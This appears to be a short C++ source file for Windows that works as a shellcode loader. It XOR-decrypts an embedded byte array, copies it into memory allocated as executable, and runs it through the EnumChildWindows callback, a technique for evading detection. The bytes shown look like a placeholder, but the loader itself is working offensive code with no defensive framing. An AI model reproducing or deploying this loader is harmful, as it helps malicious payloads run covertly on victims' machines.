#include <windows.h>
#include <stdio.h>
#include "Shellcode.h"

int main(){
    unsigned char shellcode[] = "\x45\x54\xf6\x42\x89\xee\xfa\xe2\xc\xa";

    unsigned char key = 0x0A;
    int len = sizeof(shellcode);

    Shellcode sc(shellcode,len);

    unsigned char * decrypted = sc.XOR_decrypt(key);
 

    HANDLE hAlloc = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(hAlloc, decrypted, len);
    EnumChildWindows((HWND) NULL, (WNDENUMPROC) hAlloc, NULL);

    return 0;
}
